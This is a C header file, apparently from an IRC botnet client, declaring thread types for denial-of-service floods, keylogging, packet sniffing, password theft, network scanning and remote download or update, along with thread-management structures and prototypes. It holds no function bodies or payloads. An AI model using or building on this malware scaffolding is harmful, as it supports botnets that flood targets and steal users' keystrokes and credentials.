enum {
	MAIN_THREAD,		
	KILLER_THREAD,		
	IDENT_THREAD,		
	HTTP_THREAD,		
	TFTP_THREAD,		
	RLOGIN_THREAD,		
	RCMD_THREAD,		
	SCAN_THREAD,		
	NTPASS_THREAD,		
	SYN_THREAD,			
	TCP_THREAD,			
	ICMP_THREAD,		
	PING_THREAD,		
	UDP_THREAD,			
	REDIRECT_THREAD,	
	SOCKS4_THREAD,		
	DCC_THREAD,			
	DCCCHAT_THREAD,		
	VISIT_THREAD,		
	DOWNLOAD_THREAD,	
	UPDATE_THREAD,		
	FTPTRANS_THREAD,	
	CLONE_THREAD,		
	PSNIFF_THREAD,		
	SECURE_THREAD,		
	KEYLOG_THREAD,		
	FIND_THREAD,		
	LOG_THREAD,			
	PASS_THREAD,		
	PROC_THREAD,		
	LIST_THREAD	
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   SOCKET sock;
   SOCKET csock;
   HANDLE tHandle;
   char nick[MAXNICKLEN];

} THREAD;

typedef struct TLIST
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;


int addthread(char *name, int id, SOCKET sock);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);
